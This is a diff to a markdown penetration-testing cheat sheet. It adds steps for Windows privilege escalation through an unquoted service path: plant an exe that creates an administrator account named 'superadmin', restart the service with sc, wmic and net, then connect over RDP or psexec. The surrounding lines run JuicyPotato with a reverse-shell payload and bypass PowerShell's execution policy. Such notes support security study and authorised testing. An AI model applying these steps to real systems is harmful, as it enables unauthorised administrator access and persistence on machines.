@@ -415,6 +415,16 @@ or
 > 1. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c .\GetCLSID.ps1
 > 1. JuicyPotato.exe -l 10444 -p reverse_shell_msf_venom.exe -t * -c {F2886130-0941-44EB-9335-985BA6EF1ACE}
 
+### PrivEsc Windows via Unquoted Service Path
+> 1. e.g ---> Bootp Turbo ---> https://www.exploit-db.com/exploits/49851
+> 1. create malicious ".exe" in the path, which adds a new user "superadmin" as administrator
+> 1. stop/start the service by following commands
+> 1. ```sc qc "BOOTP Turbo"```
+> 1. ```wmic service "BOOTP Turbo" call startservice```
+> 1. ```net stop "BOOTP Turbo" && net start "BOOTP Turbo"```
+> 1. if all goes well, run command ```net /users``` and you should see a new user superadmin
+> 1. ^ RDP or maybe try psexec.py etc. 
+
 ##### Download a file in Windows via FTP client 
 > 1. on Kali box first install module of ftp by running: ```pip install pyftpdlib```
 > 1. start FTP server: ```python -m pyftpdlib -p 21```
